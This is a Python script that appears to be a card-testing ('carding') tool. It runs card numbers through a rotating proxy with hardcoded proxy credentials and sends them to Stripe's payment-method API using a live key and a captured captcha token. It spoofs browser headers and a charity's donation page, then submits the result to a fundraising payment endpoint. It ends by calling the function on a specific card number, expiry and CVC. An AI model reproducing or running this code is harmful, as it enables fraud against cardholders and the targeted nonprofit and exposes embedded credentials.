"""import requests
import json

import time
import random

import uuid

import random

def generate_random_64bit_id():
    return random.randint(0, 2**64 - 1)

unique_id = generate_random_64bit_id()





# Create a session object
session = requests.Session()

# Proxy configuration
username = "31laj5twc2wba0a"
password = "kmqumffw953teoh"
proxy = "rp.proxyscrape.com:6060"
proxy_auth = "{}:{}@{}".format(username, password, proxy)

proxies = {
    "http": "http://{}".format(proxy_auth),
    "https": "http://{}".format(proxy_auth)  # Ensure HTTPS is also set if needed
}

# Set the proxies for the session
session.proxies.update(proxies)


def gates_stripes(cc, exp, exy, cvc):
    API_STUPID = 'https://api.stripe.com/v1/payment_methods'
    API_BAST = f'https://api.fundraiseup.com/paymentSession/{unique_id}/pay'

    headers = {
        "Host": "api.stripe.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://js.stripe.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=4"
    }

    payload = f"type=card&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={exp}&card[exp_year]={exy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa248f6bffb%3B+stripe-js-v3%2Fa248f6bffb%3B+split-card-element&referrer=https%3A%2F%2Fwww.pih.org&time_on_page=435594&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_172q71Hr2vwHWiAv&_stripe_version=2023-10-16&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZwCh_-YhN2NiJPQJm6B2JfBdtn2HL5jbnzkoGG7NEghxyyencRsM6wbSH5PMQhcH1E5T0mExw_C1WesFbAsxkcK5DW5OnSX5ZdgyPnpWUIR0FB6tEe30vqvTLDldzW-IP0jlxCNNLIcEqsm547EFUELR1siaTnFg3hmTNn5l4wP7TlRvuMKuN4NUFd2JPqChR9FYcJuWoq3rmtGHNEqTrEkSu5NUDWQlCJaqxIhBNOUg2DNsAEMUWf471RtyBkPKP_4UuVbTkGa6r-ZxhbVPLWVSynmTXQoah-H3KKKFdmFudMuyw_qtl5v7gm_NDSko85HhvJ3p6cq-HkJ_GLKLeB3WjYVcxwIj7yBbzC3Lr-ioe4xPEzHlX1I_YGbKbRPv81OuTYKR6yA0yhVU2sirbyV3PrKpJqa2xLWiiHUrkXRFwdQgZlDNxVGMqPI7nwGKbofVnP6Y_IAo7RHEMM6n6ybiLYQtJ_DOVSWKq-INs9eemtX1WCzE8WHIzQBuMnafATqYu8yuiqJK1p2wu6gIk_P_PHW8oWXGQUBGONJjj3CPfRNY7OSw37J7XcwXO_NjZwgi9m-B5MRpRsNjg-I3NziI2RgyvZwwa_ytcRPnOG8nbekKOC_F5C1XN-_HfdvKkSQjge7hrEk0eWMK8hu8Umm-B3L0D4auhCUcPQxU-MTIxi8VU95VqWh9Z8inEG_1oWzrqU6SjjQxwEv_LHayVMRVpAxFjmejzgm_ODg-zQa7PWUgOR0drIHuDIf0gWmytMKWzVWtgYOZKLwbP4bAL02SJwTIPSyFbSqMNGotXfkL5gilHzyPWpkNFyJ141OEzYABDHbmqbsz3VA1YRtXjRqAs93p5Me_FtIjgToNEnZNsg_jiHWV4nJdoIf9SLzN-sm3lDC_ipF5dg0O5BCp3jzfZrt4IieTuvVKUVtGWv5PEnmzvY5KAoK0C2ugfWi67-MFBB6aMK9LWJqCreqc2h8SE_zUv1gkf3Ae1Dzr0Cu6MUEGWIEbA5fOyu8Yl_p57dTglNpGJkKtfxsDPBvBHqkaxIoA2R9SjmEac34wZtZHm9pv0R42dQzt3SXAZvgvCofft-tZ1YTaZWQpA_mewup76Jnp9ibJibuKmr4_JjzOhY0-KoiGa_Q7b29-EgUexRFA412qITvJIdnO5eNHTf9wXZomazJjjyTuJd9eySgDPb5V9pXUoJ-PmeMDGzLz9OqtyefKfIdtz9KvOIyssYSTbf7P369nye_8K3Xa9dZ79kacT-Koy413MD5w9JGOBzl6CyzUAhTe8ZPl3e_Mg8lKlzqdgWmo0a0amVN4I4zgV_FRCeOy7QfmIhuQSHYTUZsCYN9Vg_tRqm1aY24oSeW7v46UKyFUYsRonId3uZ6rPXrp36X2DiET8h-6UDnvzwoMCcVyaERwh67sccvMAZ_riCoVehDsUtLluKRfLsVTgkc2Yg8Qirv2vMu1Bl97jyQIQf6UakyRaO7nSH9nInuUftWZoUbogeGUijYhrFl8IQuvlGzuxyFH4ZkKsusiSkD7UfqSGgX3128d4qBgvNmlHcsoG5LeFHgoSj-lX1GEAmJYWD-cMMw1YdK_c-YRWaLMOjV3iSrdyknLETOXwXRCiZyA5cGz_462GjvJ8ZWAMCe6a6QryvO4k0-47CMLmTkDtGpcXr4MQ4smbs3QUqSmKdVMO-2tlAZZBuDhd2DkHd-z4txpAWUaZyXEsXXVeCMsQKfDdcN7dGn_NbFZtk06RiTQ1y2JL7P_bn-50gEM2ZnRQLw8lf8U2psqbStqn0vxTSi47OkyAxpnYcLIS-bu-TXViXrKBjS6KmqwFahStynxG_QWe2gRIFXsOVQQylC4YYN_yngkh4wExfK_mrX9SbNjulqFmaFgG7paX22dHNzSs-lNjlewd1EsH9hJw5wf12QtRbnOcXIUcQ69xTYSu__ZBwpvLPZFkpuYDY4nbZjW0RpXtJ6avhGzm6V0sUufMMssbsXO_o-DlZnTkjChpduTvl9K8a8gvg3Nf5GTtpze2uxzkpSxhT6HHz36n3MV_wL4rFk8Qen0mimyWFtJIqZCRopgKn4MchnDU42MejoDtZrp-7QThm5xKa6cxHgeStEsUd80xFfJTJA79uRoB-zg48uEvYI2DHCZCqEiD21hLtM1-M4e2-ib4JlXVo7O2XCiLZ1P6Yu8WyizrRwqNleHDOZqxWdqhzaGFyZF9pZM4PcupvomtyqDQyOGZkMzk3onBkAA.JY1pbwH_2PhMzzuUbjRcOk8prupeQYPBovP8-s9cKCs"
    

    try:
        res = session.post(API_STUPID, headers=headers, data=payload).json()
    except json.JSONDecodeError:
        print('Json Error')
    except Exception as e:
        print(e)
    else:
        id = res.get('id', '')
        display_brand = res.get("card", {}).get('display_brand', '')
        exp_month = res.get("card", {}).get('exp_month', '')
        exp_year = res.get("card", {}).get('exp_year', '')
        last4 = res.get("card", {}).get('last4', '')
        created = res.get("created", '')

    headers1 = {
        "Host": "api.fundraiseup.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://www.pih.org/",
        "Content-Type": "text/plain; charset=utf-8",
        "Origin": "https://www.pih.org",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "Priority": "u=4"
    }

    payload1 = {
        "paymentMethod": {
            "id": f"{id}",
            "object": "payment_method",
            "allow_redisplay": "unspecified",
            "billing_details": {
                "address": {
                    "city": None,
                    "country": None,
                    "line1": None,
                    "line2": None,
                    "postal_code": None,
                    "state": None
                },
                "email": None,
                "name": None,
                "phone": None
            },
            "card": {
                "brand": f"{display_brand}",
                "brand_product": None,
                "checks": {
                    "address_line1_check": None,
                    "address_postal_code_check": None,
                    "cvc_check": None
                },
                "country": "MX",
                "display_brand": f"{display_brand}",
                "exp_month": exp_month,
                "exp_year": exp_year,
                "funding": "credit",
                "generated_from": None,
                "last4": f"{last4}",
                "networks": {
                    "available": [f"{display_brand}"],
                    "preferred": None
                },
                "three_d_secure_usage": {"supported": True},
                "wallet": None
            },
            "created": created,
            "customer": None,
            "livemode": True,
            "radar_options": {},
            "type": "card"
        }
    }

    try:
        resq = session.post(url=API_BAST, headers=headers1, json=payload1)
        print(resq.text)
    except Exception as e:
        print(e)

gates_stripes(cc='5212677880065329', exp='09', exy='2028', cvc='555')
"""